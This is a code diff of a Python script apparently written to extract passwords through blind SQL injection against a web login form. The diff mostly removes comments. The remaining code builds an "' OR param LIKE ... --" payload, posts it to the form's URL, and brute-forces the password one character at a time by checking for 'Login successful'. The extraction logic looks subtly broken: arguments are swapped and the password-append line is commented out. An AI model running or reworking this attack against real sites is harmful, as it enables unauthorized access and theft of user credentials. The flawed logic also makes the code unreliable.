@@ -7,8 +7,7 @@ class TestPayloadException(Exception):
     pass
 
 def test_payload(form, param, load, char):
-    # Construct the payload for SQL injection
-    payload = f"' OR {param} LIKE '{load + char}%' -- "  # Modify payload structure as needed
+    payload = f"' OR {param} LIKE '{load + char}%' -- "
     headers = {'Content-Type': 'application/json'}
       
     url = form['url']
@@ -21,7 +20,6 @@ def test_payload(form, param, load, char):
             value = payload
         new_object[obj['name']] = value
 
-    # Send the POST request with a timeout
     try:
         response = requests.post(url, headers=headers, json=new_object, timeout=5)
         response.raise_for_status()  # Raise an exception for 4xx/5xx errors
@@ -31,12 +29,10 @@ def test_payload(form, param, load, char):
             raise TestPayloadException("Server returned status code 500")
         return False
     
-    # Print the payload and response text for debugging
     if response.status_code == 200:
         print("Response text:", response.text)
         logger.log_response(response.text)
     
-    # Check if the login was successful based on response text
     return "Login successful" in response.text
 
 def blind(form):
@@ -52,20 +48,16 @@ def blind(form):
             print(f"Skipping parameter {param_name} since it already has a value.")
             continue
         
-        password = ""  # Initialize password for each parameter
+        password = ""  
         attempts = 0
         start_time = time.time()
 
         try:
-            # Sequentially test characters with some randomness
             for starting_char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                 char_found = False
                 load = starting_char
 
-                # while len(password) < max_password_length and (time.time() - start_time) < max_runtime:
-                    # Test current character
                 if test_payload(form, param_name, load, password):
-                    # password += starting_char
                     print(f"Found character: {starting_char} | Current password: {password}")
                     char_found = True
                     continue
